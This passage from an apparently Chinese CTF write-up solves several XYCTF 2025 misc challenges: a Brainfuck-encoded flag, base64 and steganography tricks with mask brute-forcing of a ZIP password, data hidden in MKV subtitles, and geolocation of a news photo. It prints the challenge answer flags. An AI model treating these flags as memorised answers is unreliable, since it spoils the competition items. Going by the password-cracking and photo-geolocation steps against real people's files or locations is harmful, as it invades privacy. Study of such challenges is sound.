operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]</code></pre>

<p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>
<h3 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h3><p>smn.txt的base64逆序，后发现jpg文件头，保存为文件</p>
<p><img src="/images/download-1744626745339-68.jpg" loading="lazy">														</p>
<p>010查看发现后面跟了PK，binwalk分解得到压缩包</p>
<p>提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份</p>
<p>还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025</p>
<p>给了两张一样的图片，双图盲水印秒了</p>
<p><img src="/images/EASY_1_decpy3-1744626745339-69.png" loading="lazy"></p>
<h3 id="MADer也要当CTFer"><a href="#MADer也要当CTFer" class="headerlink" title="MADer也要当CTFer"></a>MADer也要当CTFer</h3><p>提取mkv文件的字幕轨subs.ass</p>
<p>发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件</p>
<p>使用ae打开，发现有图层</p>
<p><img src="/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png" loading="lazy"></p>
<p>取消设置隐藏”消隐”的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。</p>
<p><img src="/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png" loading="lazy"></p>
<p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p>
<h3 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯"></a>会飞的雷克萨斯</h3><p>看图猜到是之前小孩炸车事件，直接百度该事件。</p>
<p><img src="/images/QQ_1743832187198-1744626745339-71.png" loading="lazy"></p>
<p>得到地址：四川省内江市资中县春岚北路</p>
<p>后面XXXXXX内通过地图看应该是中铁城市中心</p>
<p><img src="/images/QQ_1743832241003-1744626745339-73.png" loading="lazy"></p>
<p>flag{四川省内江市资中县春岚北路中铁城市中心内}</p>
<h3 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h3><p>搜索关键词找到题目名称：<strong>easy_polluted</strong></p>
